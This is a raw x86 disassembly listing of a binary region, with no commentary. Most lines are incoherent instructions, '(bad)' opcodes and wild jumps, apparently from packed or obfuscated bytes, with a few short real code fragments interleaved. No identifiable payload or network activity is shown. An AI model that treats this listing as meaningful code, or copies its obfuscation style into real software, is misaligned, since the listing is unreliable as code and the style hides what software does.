  40b678:	js     0x40b6e1
  40b67a:	fs push ss
  40b67c:	out    0x64,eax
  40b67e:	loope  0x40b6e0
  40b680:	and    bh,BYTE PTR [ecx+0x2]
  40b683:	fwait
  40b684:	ss hlt 
  40b686:	mov    dh,0x2e
  40b688:	jo     0x40b6f9
  40b68a:	xchg   esp,eax
  40b68b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b68c:	xchg   ebx,eax
  40b68d:	xchg   ebx,eax
  40b68e:	xor    ch,BYTE PTR [ebp+esi*2-0x2a867039]
  40b695:	dec    edx
  40b696:	test   DWORD PTR [esi+0x14cbe6a4],esp
  40b69c:	test   al,0xed
  40b69e:	scas   al,BYTE PTR es:[edi]
  40b69f:	jle    0x40b715
  40b6a1:	cmp    bl,bh
  40b6a3:	push   cs
  40b6a4:	mov    ecx,0x902fe8fa
  40b6a9:	stc    
  40b6aa:	(bad)  [eax+0x6d98d11f]
  40b6b0:	mov    eax,DWORD PTR [ebp-0x10]
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0xdd
  40b6da:	adc    al,0x7d
  40b6dc:	jmp    0x40b6b7
  40b6de:	bnd jle 0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b69e
  40b6e6:	ins    BYTE PTR es:[edi],dx
  40b6e7:	jge    0x40b75c
  40b6e9:	dec    esi
  40b6ea:	test   al,0xc3
  40b6ec:	les    eax,FWORD PTR [ecx-0x79]
  40b6ef:	in     eax,dx
  40b6f0:	sub    ah,BYTE PTR [edi]
  40b6f2:	cld    
  40b6f3:	daa    
  40b6f4:	mov    edi,0x7770d5ee
  40b6f9:	out    0x12,eax
  40b6fb:	iret   
  40b6fc:	shl    BYTE PTR [eax-0x2cd3e36e],1
  40b702:	push   ss
  40b703:	loop   0x40b68c
  40b705:	push   ecx
  40b706:	add    BYTE PTR [ebx],0x42
  40b709:	mov    ?,WORD PTR [ebx+0x30]
  40b70c:	push   0xffffffb8
  40b70e:	xchg   ebx,eax
  40b70f:	xchg   ebx,eax
  40b710:	push   ds
  40b711:	adc    BYTE PTR [ecx+0x6b109db8],0xa0
  40b718:	je     0x40b6e4
  40b71a:	xor    eax,DWORD PTR [ebx+0x3098a20a]
  40b720:	adc    al,BYTE PTR [edi-0x1a133d29]
  40b726:	mov    eax,ds:0x1cf5c925
  40b72b:	inc    ebp
  40b72c:	loopne 0x40b6bf
  40b72e:	mov    edi,0x98329c25
  40b733:	cmp    ebx,DWORD PTR [edi-0x1b466fca]
  40b739:	and    esp,DWORD PTR [esi-0x3e0f80e5]
  40b73f:	push   esi
  40b740:	cdq    
  40b741:	popf   
  40b742:	rol    BYTE PTR [esi],cl
  40b744:	and    bh,ah
  40b746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b747:	mov    al,BYTE PTR [edx+0x77c57d28]
  40b74d:	ins    DWORD PTR es:[edi],dx
  40b74e:	cmp    al,0xa3
  40b750:	jnp    0x40b703
  40b752:	or     al,0xeb
  40b754:	inc    eax
  40b755:	enter  0x6eaa,0x51
  40b759:	pop    es
  40b75a:	jl     0x40b7bb
  40b75c:	pop    eax
  40b75d:	clc    
  40b75e:	shl    DWORD PTR [ecx],0x8f
  40b761:	xor    bl,BYTE PTR gs:[edi+0x4ba823a6]
  40b768:	mov    dh,bh
  40b76a:	cmp    BYTE PTR [esi-0x6568c6a0],al
  40b770:	iret   
  40b771:	scas   al,BYTE PTR es:[edi]
  40b772:	pop    esp
  40b773:	jo     0x40b7ae
  40b775:	repz (bad) 
  40b777:	(bad)  
  40b778:	int3   
  40b779:	aam    0x54
  40b77b:	sbb    dh,BYTE PTR [esp+eiz*4]
  40b77e:	arpl   WORD PTR [edx-0x22],bp
  40b781:	test   DWORD PTR [edi+0x64],eax
  40b784:	push   ecx
  40b785:	call   0x999a:0x3425a09e
  40b78c:	mov    ebx,DWORD PTR [ecx-0x388a5cd1]
  40b792:	(bad)  
  40b793:	pop    ecx
  40b794:	cmp    BYTE PTR [eax+0x33],al
  40b797:	shr    BYTE PTR [edx],1
  40b799:	fdivp  st(6),st
  40b79b:	call   0x56ee:0x49b6bf3e
  40b7a2:	pop    eax
  40b7a3:	(bad)  
  40b7a5:	push   ecx
  40b7a6:	sbb    al,0x1c
  40b7a8:	mov    ah,BYTE PTR [eax]
  40b7aa:	adc    bl,BYTE PTR [ebx+0xf]
  40b7ad:	(bad)  
  40b7ae:	jnp    0x40b78b
  40b7b0:	inc    ecx
  40b7b1:	dec    eax
  40b7b2:	cmp    dh,dh
  40b7b4:	jecxz  0x40b783
  40b7b6:	gs fs std 
  40b7b9:	mov    bl,0x5d
  40b7bb:	fsub   QWORD PTR [esi]
  40b7bd:	int3   
  40b7be:	and    ebp,DWORD PTR [edx-0x5800a714]
  40b7c4:	jne    0x40b82e
  40b7c6:	sbb    DWORD PTR [ebp-0x6aa1f654],ecx
  40b7cc:	lods   eax,DWORD PTR ds:[esi]
  40b7cd:	dec    esp
  40b7ce:	shl    esp,cl
  40b7d0:	or     eax,0x7462deff
  40b7d5:	shl    DWORD PTR [edi+0x25901c8],1
  40b7db:	or     cl,BYTE PTR [eax+0x1d]
  40b7de:	ins    BYTE PTR es:[edi],dx
  40b7df:	dec    edi
  40b7e0:	inc    ecx
  40b7e1:	out    dx,al
  40b7e2:	mov    WORD PTR [ecx-0x1d],?
  40b7e5:	jmp    0x5139b456
  40b7ea:	aam    0x94
  40b7ec:	add    edi,0x500fc4a5
  40b7f2:	adc    esp,esi
  40b7f4:	jns    0x40b7e1
  40b7f6:	ficomp WORD PTR [esi+0x30c9876d]
  40b7fc:	pop    ds
  40b7fd:	(bad)  
  40b7fe:	neg    BYTE PTR [edx+ecx*8]
  40b801:	cli    
  40b802:	inc    edx
  40b803:	push   esp
  40b804:	mov    ebp,0xb3c2611e
  40b809:	pop    esi
  40b80a:	sbb    esp,DWORD PTR [edx+0x61]
  40b80d:	add    edi,eax
  40b80f:	mov    ds:0x3254b632,eax
  40b814:	mov    DWORD PTR [ecx-0x4d45a561],ecx
  40b81a:	int3   
  40b81b:	pop    ecx
  40b81c:	inc    eax
  40b81d:	and    dl,BYTE PTR [ebx-0x9]
  40b820:	out    0x80,eax
  40b822:	pop    esp
  40b823:	mov    ds:0x4fc109ad,al
  40b828:	mov    dh,0xe6
  40b82a:	jo     0x40b888
  40b82c:	outs   dx,DWORD PTR ds:[esi]
  40b82d:	xchg   esi,eax
  40b82e:	std    
  40b82f:	adc    DWORD PTR [ecx],ecx
  40b831:	sub    al,0x22
  40b833:	sar    eax,1
  40b835:	mov    ah,0xb4
  40b837:	jae    0x40b82b
  40b839:	xchg   ebx,eax
  40b83a:	jmp    DWORD PTR [esi-0x3c1ecacc]
  40b840:	loop   0x40b813
  40b842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b843:	fmul   DWORD PTR [edi+0x73]
  40b846:	jbe    0x40b89c
  40b848:	sbb    esi,DWORD PTR [edx+0x77232aa4]
  40b84e:	call   0x22741a02
  40b853:	test   BYTE PTR [esi],dh
  40b855:	push   ebx
  40b856:	fwait
  40b857:	pop    ss
  40b858:	cmp    DWORD PTR [edi-0x751ae30a],edi
  40b85e:	push   edx
  40b85f:	sti    
  40b860:	mov    eax,0x71d3a08a
  40b865:	mov    dl,0xab
  40b867:	adc    eax,0xe129c184
  40b86c:	cdq    
  40b86d:	mov    dh,0xea
  40b86f:	cmp    eax,DWORD PTR [edi]
  40b871:	jmp    FWORD PTR [edx]
  40b873:	push   eax
  40b874:	aas    
  40b875:	mov    WORD PTR ss:[esi-0x62],es
  40b879:	jnp    0x40b837
  40b87b:	mov    edx,0x587c0801
  40b880:	add    al,0xfb
  40b882:	sbb    DWORD PTR [ecx+0x0],eax
  40b885:	xchg   ecx,eax
  40b886:	inc    edx
  40b887:	cmc    
  40b888:	inc    edx
  40b889:	std    
  40b88a:	xlat   BYTE PTR ds:[ebx]
  40b88b:	lods   al,BYTE PTR ds:[esi]
  40b88c:	fstp   DWORD PTR [ecx+0x33]
  40b88f:	add    DWORD PTR [ebp+0x1b],0xffffffe5
  40b893:	cmp    eax,0x8dbd1832
  40b898:	js     0x40b886
  40b89a:	mov    DWORD PTR [esp+ebp*8-0x5195abe8],0x35f9cda
  40b8a5:	ret    0x60bb
  40b8a8:	stos   BYTE PTR es:[edi],al
  40b8a9:	mov    eax,0x37afce7f
  40b8ae:	sbb    bl,BYTE PTR [esi+0x2a6567d2]
  40b8b4:	sub    esp,eax
  40b8b6:	inc    ebx
  40b8b7:	jno    0x40b8a5
  40b8b9:	mov    ebp,0xc828653c
  40b8be:	push   cs
  40b8bf:	pop    edx
  40b8c0:	mov    bh,0x26
  40b8c2:	jg     0x40b88f
  40b8c4:	aam    0xfd
  40b8c6:	sub    al,0xc9
  40b8c8:	mov    ebp,0xc4896854
  40b8cd:	inc    esp
  40b8ce:	daa    
  40b8cf:	sub    BYTE PTR [edi+0x71b7d3e5],ah
  40b8d5:	or     BYTE PTR [esi+0x76],cl
  40b8d8:	xlat   BYTE PTR ds:[ebx]
  40b8d9:	xor    ecx,ecx
  40b8db:	jl     0x40b886
  40b8dd:	and    bl,cl
  40b8df:	in     al,0x61
  40b8e1:	cmp    al,0x42
  40b8e3:	mov    ah,0xc3
  40b8e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8e6:	ret    0x2751
  40b8e9:	(bad)  
  40b8ea:	repz gs jge 0x40b889
  40b8ee:	int3   
  40b8ef:	dec    ecx
  40b8f0:	enter  0x4092,0xae
  40b8f4:	outs   dx,DWORD PTR ds:[esi]
  40b8f5:	sar    BYTE PTR [ebx+0xb],0x8e
  40b8f9:	mov    ecx,DWORD PTR [edx-0x16]
  40b8fc:	and    ah,BYTE PTR [ebp+0x4f]
  40b8ff:	mov    ebx,0xe077d938
  40b904:	mov    WORD PTR [edx+0x4f],ds
  40b907:	sbb    ebx,edi
  40b909:	mov    ebx,0x9a9577b7
  40b90e:	imul   edx,DWORD PTR [esi-0x59],0xa8913851
  40b915:	push   esi
  40b916:	(bad)  
  40b917:	mov    ds:0xb58f4bf8,al
  40b91c:	cli    
  40b91d:	neg    eax
  40b91f:	scas   eax,DWORD PTR es:[edi]
  40b920:	mov    ds:0xf1ed7f0f,eax
  40b925:	mov    ebx,0x655f6b92
  40b92a:	pop    ss
  40b92b:	dec    edx
  40b92c:	jge    0x40b938
  40b92e:	enter  0x7bdf,0x3c
  40b932:	in     eax,0xad
  40b934:	retf   0x1b72
  40b937:	js     0x40b951
  40b939:	clc    
  40b93a:	xor    BYTE PTR [ebp-0x602cecd5],al
  40b940:	mov    DWORD PTR [esi],ecx
  40b942:	jl     0x40b945
  40b944:	(bad)  
  40b945:	sub    esp,ebp
  40b947:	mov    ch,0xe5
  40b949:	std    
  40b94a:	push   ebp
  40b94b:	xor    ebp,DWORD PTR [esi+0x8]
  40b94e:	jae    0x40b916
  40b950:	das    
  40b951:	add    BYTE PTR [eax],cl
  40b953:	mov    esp,DWORD PTR [esi+0x3]
  40b956:	push   ss
  40b957:	xchg   ecx,eax
  40b958:	mov    cl,0xc4
  40b95a:	or     eax,0xbf3acb92
  40b95f:	ror    BYTE PTR ds:[esi],0x2f
  40b963:	ror    DWORD PTR [ebx+0x7548cf3e],1
  40b969:	sbb    BYTE PTR [esi],dh
  40b96b:	in     eax,0x35
  40b96d:	enter  0xc5d6,0xec
  40b971:	or     BYTE PTR [ebx-0x6bdb309e],ah
  40b977:	scas   al,BYTE PTR es:[edi]
  40b978:	adc    ebp,DWORD PTR [ebx]
  40b97a:	sbb    ebp,DWORD PTR ds:0x48e8b61e
  40b980:	cmp    edx,esi
  40b982:	pop    edx
  40b983:	loope  0x40b9b1
  40b985:	pop    ebx
  40b986:	jle    0x40b9e5
  40b988:	xor    edi,DWORD PTR [eax+0x1c]
  40b98b:	out    0xe0,al
  40b98d:	out    dx,eax
  40b98e:	inc    eax
  40b98f:	pop    ss
  40b990:	fild   WORD PTR [esi+0x57725879]
  40b996:	jmp    0xda3df93a
  40b99b:	cld    
  40b99c:	sbb    eax,0xbf6052fe
  40b9a1:	inc    esi
  40b9a2:	or     cl,BYTE PTR [ebx]
  40b9a4:	cmp    esi,edx
  40b9a6:	push   esi
  40b9a7:	sub    ah,BYTE PTR [ebp+0x69]
  40b9aa:	leave  
  40b9ab:	mov    edx,0x45f58fd0
  40b9b0:	push   ecx
  40b9b1:	and    ch,BYTE PTR [edx]
  40b9b3:	fist   DWORD PTR [ecx-0x4]
  40b9b6:	ret    
  40b9b7:	ret    
  40b9b8:	call   0x8725:0xa8f15ca4
  40b9bf:	adc    ebx,DWORD PTR [esi]
  40b9c1:	das    
  40b9c2:	or     eax,0x1f58b176
  40b9c7:	sub    BYTE PTR [esi-0x3780f16f],ch
  40b9cd:	clc    
  40b9ce:	jo     0x40b9af
  40b9d0:	pop    ds
  40b9d1:	(bad)  
  40b9d2:	xchg   edi,eax
  40b9d3:	pop    ebp
  40b9d4:	adc    BYTE PTR [ebx],0xe5
  40b9d7:	and    eax,eax
  40b9d9:	sub    DWORD PTR [edi+0x37],esp
  40b9dc:	mov    ecx,0xd2b35a0e
  40b9e1:	lea    ebp,[edx]
  40b9e3:	dec    ebx
  40b9e4:	dec    ecx
  40b9e5:	shl    BYTE PTR [esi+0x76e005e],1
  40b9eb:	add    eax,0x5ed663c4
  40b9f0:	je     0x40b9ad
  40b9f2:	fwait
  40b9f3:	in     al,dx
  40b9f4:	pop    ss
  40b9f5:	(bad)  
  40b9f6:	pop    eax
  40b9f7:	pop    ebx
  40b9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9f9:	add    eax,0xeb0577a7
  40b9fe:	cmp    dl,BYTE PTR fs:0xb6b0bbb3
  40ba05:	xchg   edi,eax
  40ba06:	push   ecx
  40ba07:	sub    eax,DWORD PTR [eax]
  40ba09:	sbb    BYTE PTR [edi-0x75f06061],al
  40ba0f:	sub    bx,bp
  40ba12:	icebp  
  40ba13:	fdivr  QWORD PTR [esi+eiz*2-0x75]
  40ba17:	dec    ebp
  40ba18:	cld    
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	dec    ebx
  40ba37:	mov    DWORD PTR [ecx+ecx*4],ebp
  40ba3a:	icebp  
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba73
  40ba42:	push   es
  40ba43:	inc    ecx
  40ba44:	pop    ss
  40ba45:	push   eax
  40ba46:	ror    BYTE PTR gs:[ebx-0x2773266e],cl
  40ba4d:	mov    al,ds:0xb3aaa1ee
  40ba52:	adc    DWORD PTR [ebp+0x2c],esi
  40ba55:	cmp    al,0x49
  40ba57:	lock adc ah,BYTE PTR [edi]
  40ba5a:	sbb    edx,DWORD PTR [esi-0x22]
  40ba5d:	sbb    dh,BYTE PTR [ebp-0x40fb21b9]
  40ba63:	lods   eax,DWORD PTR ds:[esi]
  40ba64:	out    0xa0,eax
  40ba66:	dec    edi
  40ba67:	push   DWORD PTR [edi+0x22]
  40ba6a:	mov    ebp,0x48419153
  40ba6f:	je     0x40ba8f
  40ba71:	stc    
  40ba72:	in     ax,dx
  40ba74:	push   esi
  40ba75:	cmp    esp,DWORD PTR [ebp+edx*4-0x26]
  40ba79:	jmp    0x40baef
  40ba7b:	and    DWORD PTR [eax],edi
  40ba7d:	aaa    
  40ba7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba7f:	and    DWORD PTR [eax+0x68],0xffffffc3
  40ba83:	int3   
  40ba84:	pop    esp
  40ba85:	sbb    eax,0x32bf62f0
  40ba8a:	and    bh,BYTE PTR [ecx+eax*8-0x3c08760c]
  40ba91:	dec    ebx
  40ba92:	idiv   DWORD PTR [ecx-0x59]
  40ba95:	or     cl,ch
  40ba97:	push   edx
  40ba98:	fistp  QWORD PTR [ecx+0x2e1cb038]
  40ba9e:	call   0x93936ef5
  40baa3:	sub    ah,BYTE PTR [esi-0x15f2fece]
  40baa9:	sub    al,0x42
  40baab:	in     al,0x3e
  40baad:	into   
  40baae:	jbe    0x40ba4f
  40bab0:	rcr    DWORD PTR [eax],cl
  40bab2:	das    
  40bab3:	sbb    ebx,DWORD PTR [ebx-0x23]
  40bab6:	sets   BYTE PTR [esi+0x6e]
  40baba:	adc    al,0x7a
  40babc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40babd:	pop    edx
  40babe:	adc    DWORD PTR [edi],eax
  40bac0:	cmc    
  40bac1:	enter  0x9fa3,0x14
  40bac5:	popf   
  40bac6:	ins    BYTE PTR es:[edi],dx
  40bac7:	mov    ah,0xe2
  40bac9:	or     DWORD PTR [eax],edi
  40bacb:	ret    0xa18c
  40bace:	pushf  
  40bacf:	jl     0x40ba96
  40bad1:	js     0x40ba70
  40bad3:	pop    es
  40bad4:	sbb    eax,0xd86983b6
  40bad9:	pop    ebp
  40bada:	lock test eax,0x8f6a104f
  40bae0:	or     al,0xcc
  40bae2:	xor    edi,esp
  40bae4:	pop    ecx
  40bae5:	inc    eax
  40bae6:	inc    eax
  40bae7:	xchg   esp,eax
  40bae8:	cmp    ecx,eax
  40baea:	mov    ch,0xf6
  40baec:	or     DWORD PTR [eax+0x4dd882ef],ebx
  40baf2:	xchg   edx,eax
  40baf3:	stc    
  40baf4:	push   0x19ee5698
  40baf9:	call   0x575ce08c
  40bafe:	sbb    esi,DWORD PTR [esi-0x6b]
  40bb01:	pop    es
  40bb02:	ja     0x40bae7
  40bb04:	sub    BYTE PTR [ebp*4+0x4d0de24a],0x8a
  40bb0c:	pop    ss
  40bb0d:	xor    DWORD PTR [ebx-0x65],0x75
  40bb11:	enter  0x9216,0x65
  40bb15:	dec    ebx
  40bb16:	jno    0x40baf7
  40bb18:	retf   
  40bb19:	sar    DWORD PTR [ebp-0x58483804],1
  40bb1f:	mov    dh,0x46
  40bb21:	mov    ecx,edx
  40bb23:	xchg   esp,eax
  40bb24:	jecxz  0x40babd
  40bb26:	jae    0x40bb56
  40bb28:	call   0xd595b4ee
  40bb2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb2e:	push   0x4a
  40bb30:	adc    eax,DWORD PTR [esi+0x1b]
  40bb33:	or     edi,ecx
  40bb35:	shl    DWORD PTR [ebx+ebx*4+0x54973fc3],0x4
  40bb3d:	fcmovu st,st(0)
  40bb3f:	outs   dx,BYTE PTR ds:[esi]
  40bb40:	add    eax,DWORD PTR [esi+0x48397ae4]
  40bb46:	bound  eax,QWORD PTR [ecx]
  40bb48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb49:	sub    DWORD PTR [ecx+0x2de9dff7],esi
  40bb4f:	xor    BYTE PTR [ecx-0x5b],al
  40bb52:	mov    bl,0x31
  40bb54:	jle    0x40bb48
  40bb56:	mov    bh,BYTE PTR [edi+0x40]
  40bb59:	sub    bl,BYTE PTR [ecx+0x41]
  40bb5c:	pop    ebx
  40bb5d:	add    eax,0x3809f457
  40bb62:	xchg   esi,eax
  40bb63:	sbb    cl,BYTE PTR [edi]
  40bb65:	std    
  40bb66:	push   esi
  40bb67:	mov    al,ds:0x95b231ab
  40bb6c:	int    0xd3
  40bb6e:	sub    al,0x46
  40bb70:	xor    eax,0x1abcbf35
  40bb75:	ss js  0x40bbee
  40bb78:	(bad)  
  40bb7a:	push   ecx
  40bb7b:	push   ebp
  40bb7c:	jl     0x40bb95
  40bb7e:	daa    
  40bb7f:	call   0x54c4:0xb31803bd
  40bb86:	sub    ecx,edi
  40bb88:	pushf  
  40bb89:	jne    0x40bbba
  40bb8b:	lahf   
  40bb8c:	repnz mov al,ds:0x60c1efd6
  40bb92:	gs push ds
  40bb94:	push   ds
  40bb95:	sahf   
  40bb96:	mul    BYTE PTR [esi-0x25]
  40bb99:	mov    ebp,0x1ab94d84
  40bb9e:	out    dx,eax
  40bb9f:	and    BYTE PTR [ebx+ebp*1],dl
  40bba2:	loop   0x40bb26
  40bba4:	cwde   
  40bba5:	hlt    
  40bba6:	pop    edi
  40bba7:	adc    al,0xf8
  40bba9:	fisttp QWORD PTR [ebx+0x4c1ae6c4]
  40bbaf:	cld    
  40bbb0:	in     eax,dx
  40bbb1:	push   esi
  40bbb2:	sub    al,0x2f
  40bbb4:	cs cmp eax,0x97a512b7
  40bbba:	xchg   esp,eax
  40bbbb:	outs   dx,DWORD PTR ds:[esi]
  40bbbc:	push   ebx
  40bbbd:	xor    eax,0x8869ebb0
  40bbc2:	sbb    edi,edx
  40bbc4:	retf   
  40bbc5:	push   esi
  40bbc6:	and    DWORD PTR [esi+0x1d61903c],esi
  40bbcc:	and    DWORD PTR [esi],esi
  40bbce:	add    DWORD PTR [ebx+0x68],edx
  40bbd1:	nop
  40bbd2:	adc    al,BYTE PTR [esi-0x69]
  40bbd5:	jg     0x40bbdf
  40bbd7:	pusha  
  40bbd8:	push   es
  40bbd9:	(bad)  
  40bbdb:	mov    eax,0x6c48fe38
  40bbe0:	dec    eax
  40bbe1:	jle    0x40bb86
  40bbe3:	cmp    DWORD PTR [esi],edi
  40bbe5:	add    edx,DWORD PTR [ecx]
  40bbe7:	xchg   edx,eax
  40bbe8:	cli    
  40bbe9:	cwde   
  40bbea:	cld    
  40bbeb:	xchg   ebp,eax
  40bbec:	and    BYTE PTR [eax-0x475b2faa],ah
  40bbf2:	sar    BYTE PTR [ebp-0x28],0x0
  40bbf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbf7:	in     al,dx
  40bbf8:	xchg   DWORD PTR [esp+ebx*8],esi
  40bbfb:	add    al,0xc7
  40bbfd:	sbb    ecx,DWORD PTR [edx+ebx*4]
  40bc00:	dec    ebp
  40bc01:	mov    edx,0xf2457a0c
  40bc06:	add    ch,BYTE PTR [esi+0x1dbd428e]
  40bc0c:	xchg   ebx,eax
  40bc0d:	cmc    
  40bc0e:	add    eax,0x502f0b59
  40bc13:	mov    ss,esp
  40bc15:	test   al,0x2e
  40bc17:	popa   
  40bc18:	xor    DWORD PTR [ebx+0x79f0ab6b],esp
  40bc1e:	mov    dh,0x9e
  40bc20:	(bad)
  40bc23:	mov    dl,ah
  40bc25:	cmp    al,0x7f
  40bc27:	xchg   edx,eax
  40bc28:	into   
  40bc29:	das    
  40bc2a:	bound  esi,QWORD PTR [ebp+0x5]
  40bc2d:	pop    edx
  40bc2e:	lahf   
  40bc2f:	inc    DWORD PTR [edx-0x6]
  40bc32:	jns    0x40bbe8
  40bc34:	push   0x36
  40bc36:	xchg   ebx,eax
  40bc37:	jae    0x6a6ffac
  40bc3d:	sub    BYTE PTR [edi+edi*2],dh
  40bc40:	add    DWORD PTR [esi+0x55563fae],ebx
  40bc46:	(bad)  
  40bc47:	inc    esi
  40bc48:	mov    al,ds:0x9635c062
  40bc4d:	inc    edx
  40bc4e:	mov    cl,0x1d
  40bc50:	push   ds
  40bc51:	das    
  40bc52:	mov    ebx,?
  40bc54:	jl     0x40bc66
  40bc56:	push   ss
  40bc57:	pop    ebp
  40bc58:	or     DWORD PTR [ebx+0x2026f388],edi
  40bc5e:	and    BYTE PTR [eax+0x1645c125],al
  40bc64:	jmp    0xf544:0x5025272b
  40bc6b:	into   
  40bc6c:	ds pop es
  40bc6e:	dec    edx
  40bc6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc70:	outs   dx,DWORD PTR ds:[esi]
  40bc71:	gs je  0x40bce6
  40bc74:	ds jne 0x40bc1b
  40bc77:	adc    DWORD PTR [edi+0x39bb12e6],esi
  40bc7d:	mov    ds:0xc0461c91,al
  40bc82:	mov    ebx,ds
  40bc84:	cmp    BYTE PTR [esi-0x7],dl
  40bc87:	inc    ecx
  40bc88:	fstp   TBYTE PTR [edx-0x10]
  40bc8b:	stos   BYTE PTR es:[edi],al
  40bc8c:	xor    BYTE PTR [ebx],dh
  40bc8e:	call   0x5625055
  40bc93:	enter  0x1f2a,0xa3
  40bc97:	adc    BYTE PTR [ebx+edi*2],0x66
  40bc9b:	sahf   
  40bc9c:	sbb    esi,esp
  40bc9e:	mov    edx,0x90d310c5
  40bca3:	outs   dx,DWORD PTR ds:[esi]
  40bca4:	js     0x40bcf5
  40bca6:	nop
  40bca7:	add    DWORD PTR [edi-0x41],edi
  40bcaa:	xor    ch,al
  40bcac:	cs ret 
  40bcae:	mov    ah,0xdb
  40bcb0:	call   0xf469a597
  40bcb5:	inc    ebp
  40bcb6:	adc    BYTE PTR [edx],ah
  40bcb8:	jb     0x40bd09
  40bcba:	mov    edi,0xb5533455
  40bcbf:	gs and eax,0xaea34c07
  40bcc5:	xchg   ecx,eax
  40bcc6:	xchg   ecx,eax
  40bcc7:	dec    eax
  40bcc8:	xor    DWORD PTR [ebp+0x37],edx
  40bccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bccc:	out    dx,eax
  40bccd:	xor    bl,BYTE PTR [ecx-0x19b8c383]
  40bcd3:	ror    esp,0xf7
  40bcd6:	add    DWORD PTR [ecx],ebx
  40bcd8:	mov    esi,0x39fb5ebe
  40bcdd:	aaa    
  40bcde:	hlt    
  40bcdf:	fist   WORD PTR [eax+0x39]
  40bce2:	inc    ebx
  40bce3:	push   esi
  40bce4:	fistp  QWORD PTR [ecx]
  40bce6:	adc    BYTE PTR [ebp-0x3a],0x40
  40bcea:	add    edi,DWORD PTR [edx+0x37497cc0]
  40bcf0:	rol    BYTE PTR [edx*4+0x2cc9a9f3],cl
  40bcf7:	cmp    DWORD PTR [eax+0x8173c2a],0x16
  40bcfe:	loope  0x40bd0c
  40bd00:	cwde   
  40bd01:	dec    ebp
  40bd02:	cmp    BYTE PTR [esi+0x6c],cl
  40bd05:	in     al,dx
  40bd06:	aaa    
  40bd07:	adc    al,0x76
  40bd09:	pushf  
  40bd0a:	push   0xfffffffb
  40bd0c:	add    eax,0xa2b1d924
  40bd11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd12:	push   es
  40bd13:	or     DWORD PTR [ecx],edx
  40bd15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd16:	push   eax
  40bd17:	mov    esi,0xc9cf0c79
  40bd1c:	add    DWORD PTR [edx+edi*8+0x66738462],esp
  40bd23:	repz push esi
  40bd25:	ds clc 
  40bd27:	push   ss
  40bd28:	repz xor cl,BYTE PTR [edi+0x2b]
  40bd2c:	test   eax,0x26fed1f0
  40bd31:	sbb    edx,ebp
  40bd33:	das    
  40bd34:	push   0x64
  40bd36:	adc    al,0xde
  40bd38:	ss mov ah,0xd0
  40bd3b:	jo     0x40bd9e
  40bd3d:	sub    edx,DWORD PTR [edx+0x2c]
  40bd40:	popa   
  40bd41:	pop    ebx
  40bd42:	pop    esp
  40bd43:	rcl    DWORD PTR [ebp+0x21437cf4],cl
  40bd49:	fisttp WORD PTR [ebx]
  40bd4b:	add    cl,0xef
  40bd4e:	dec    esp
  40bd4f:	inc    ebx
  40bd50:	jmp    0x348e87c
  40bd55:	fs je  0x40bdc6
  40bd58:	push   ecx
  40bd59:	dec    edi
  40bd5a:	aas    
  40bd5b:	pop    esi
  40bd5c:	dec    esi
  40bd5d:	mov    edx,0x36009899
  40bd62:	ins    DWORD PTR es:[edi],dx
  40bd63:	inc    ebp
  40bd64:	ja     0x40bd6a
  40bd66:	(bad)  
  40bd68:	sahf   
  40bd69:	mov    ss,WORD PTR [ebx-0x2840421f]
  40bd6f:	sbb    BYTE PTR [esi],bl
  40bd71:	mov    ecx,DWORD PTR [ebp+0xc]
  40bd74:	xor    eax,esi
  40bd76:	add    eax,eax
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz lds ebp,FWORD PTR ds:0xfcb95210
  40bd91:	jle    0x40be11
  40bd93:	cs jge 0x40be14
  40bd96:	jle    0x40bdc1
  40bd98:	(bad)  
  40bd99:	jbe    0x40bd82
  40bd9b:	push   ebx
  40bd9c:	mul    BYTE PTR [ecx+0x5c491ad]
  40bda2:	inc    edi
  40bda3:	xchg   esi,eax
  40bda4:	mov    BYTE PTR [eax+0x6c],cl
  40bda7:	and    cl,dl
  40bda9:	sbb    ebx,DWORD PTR [ebx-0x14087e36]
  40bdaf:	idiv   DWORD PTR [edi]
  40bdb1:	add    eax,0x40ae204d
  40bdb6:	dec    ebx
  40bdb7:	fsubr  DWORD PTR [eax-0x7]
  40bdba:	sti    
  40bdbb:	(bad)  
  40bdbd:	mov    esp,0x84f04e06
  40bdc2:	jl     0x40be06
